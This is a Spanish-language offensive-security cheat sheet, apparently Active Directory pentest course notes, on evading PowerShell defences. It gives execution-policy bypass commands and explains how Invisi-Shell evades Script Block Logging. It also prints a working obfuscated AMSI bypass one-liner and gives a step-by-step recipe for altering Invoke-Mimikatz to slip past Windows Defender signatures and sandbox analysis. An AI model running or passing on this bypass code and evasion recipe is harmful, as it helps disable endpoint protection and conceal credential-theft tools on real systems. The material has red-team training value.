# Bypass

Tags: #Powershell #AD #InvisiShell #AMSITrigger #DefenderCheck

## Detecciones de Powershell

```bash 
1. System-wide Transcription
2. Script Block Logging 
3. AntiMalware Scan Interface (AMSI)
4. Constrined Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)
```

## Política de ejecución 

* [15 ways to bypass Powershell execution policy](https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy)

```powershell 
# No es una medida de seguridad, esta presente para prevenir que los usuarios accidentalmente ejecuten scripts 

❯ powershell -ExecutionPolicy bypass 

❯ powershell -c <cmd>

❯ powershell -encodedcommand 
$env:PSExecutionPolicyPreference="bypass"
```

## Bypassing PowerShell Security 

* [Invisi-shell](https://github.com/OmerYa/Invisi-Shell)

```bash 
1. Invisi-Shell permite ejecutar PowerShell con menor logging y visibilidad, ayudando a evadir mecanismos como 'Script Block Logging y ETW'.

2. No modifica archivos ni ensamblados en disco; realiza hooking en memoria de funciones internas de PowerShell.

3. Usa la CLR Profiling API para cargar un profiler que intercepta llamadas del runtime durante la ejecución.

4. El profiler del CLR es una DLL cargada en tiempo de ejecución, que permite interceptar funciones internas sin alterar el sistema.
```

```bash 
# Los scripts de Invisi-Shell crean una sesión de PowerShell más sigilosa habilitando CLR profiling y cargando un profiler en memoria. Con el fin de ejecutar tools de AD con menor detección.

❯ RunWithPathAsAdmin.bat           # Ejecutar con privilegios de admin
❯ RunWithRegistryNonAdmin.bat      # Ejecutar sin privilegios


Nota:
	1. Escribir 'Exit' desde la nueva sesión de Powershell para limpiar la consola 
```

```bash 
Funciona bien!!
# Desactiva temporalmente la política de ejecución de PowerShell en el proceso actual, permitiendo ejecutar scripts no firmados sin restricciones

❯ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process  
```

## Bypassing AV Signatures for Powershell 

* [AMSITrigger](https://github.com/RythmStick/AMSITrigger)
* [DefenderCheck](https://github.com/t3hbb/DefenderCheck)
* [Full - Ofuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

```bash 
1. Siempre se puede cargar scripts en memoria y evitar la detección usando AMSI bypass
2. Usar AMSITrigger o DefenderCheck para identificar código y strings desde un binario o script que Windows Defender podría marcar como sospechoso (malicioso)
3. Invoke-Ofuscation es usado para tener una ofuscación total del script en Powershell 
```

```bash 
❯ .\AmsiTrigger_x64.exe -i C:\AD\Invoke-PowershellTcp.ps1   
❯ .\DefenderCheck.exe PowerUp.ps1


NOTA:
	1. Si quieres ofuscar el 'PowerUp.ps1' ir a la linea '2640' y eliminar el contenido de la variable '$B64Binary = ""'
```

```powershell 
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
## Bypassing AV Signatures for Powershell 

```bash 
Los pasos para evitar la detección basada en firmas son:
1. Escanear usando AMSITrigger
2. Modificar el fragmento de código detectado
3. Volver a escanear usando AMSITrigger
4. Repetir los pasos 2 y 3 hasta obtener un resultado como “AMSI_RESULT_NOT_DETECTED” o “Blank”
```

## Bypassing AV Signatures for Powershell  - Invoke-Mimikatz

```bash 
En Mimikatz existen múltiples detecciones, por lo que es necesario hacer varios cambios:

1. Remover los comentarios por 'default'
2. Cambiar el nombre del script, los nombres de las funciones y las variables 
3. Modificar los nombres de las variables de las llamadas a la API de Win32 que se detectan
4. Ofuscar contenido de PEBytes -> DLL de PowerKatz usando paquetes 
5. Implementar una función inversa para los PEBytes para evitar cualquier firma estatica 
6. Agregar una verificación de espacio aislado para desperdiciar recursos de análisis dinámico
7. Retirar las advertencias reflectantes de PE para una salida limpia 
8. Utilizar comandos ofuscados para la ejecución de Invoke-MimiEx
9. Análizar usando DefenderCheck
   ❯ .\DefenderCheck.exe Invoke-Mimi.ps1
   ❯ .\DefenderCheck.exe Invoke-MimiEx.ps1
```